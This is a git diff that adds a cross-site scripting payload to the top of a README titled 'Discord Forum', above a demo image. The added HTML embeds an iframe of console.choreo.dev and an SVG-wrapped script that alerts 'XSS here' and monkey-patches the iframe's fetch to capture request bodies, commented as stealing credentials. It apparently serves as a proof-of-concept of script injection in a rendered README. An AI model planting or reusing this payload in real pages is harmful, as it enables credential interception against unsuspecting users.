@@ -1,4 +1,27 @@
 # Discord Forum
+
+<iframe src='https://console.choreo.dev/' id='xss'></iframe>
+<svg>
+  <script type="text/javascript">
+    alert("Oops… XSS here");
+    const iframe = document.getElementById('xss');
+    iframe.addEventListener('load', () => {
+      try {
+        const iframeWindow = iframe.contentWindow;
+        const originalFetch = iframeWindow.fetch.bind(iframeWindow);
+        // Monkey-patching the fetch API to intercept credentials
+        iframeWindow.fetch = async function(url, options) {
+          console.log('Intercepted:', url, options);
+          alert(options.body); // Credentials stolen!
+          return originalFetch(url, options);
+        };
+      } catch (e) {
+        console.error(e);
+      }
+    });
+  </script>
+</svg>
+
 ## Demo
 ![Demo](demo.gif)
 
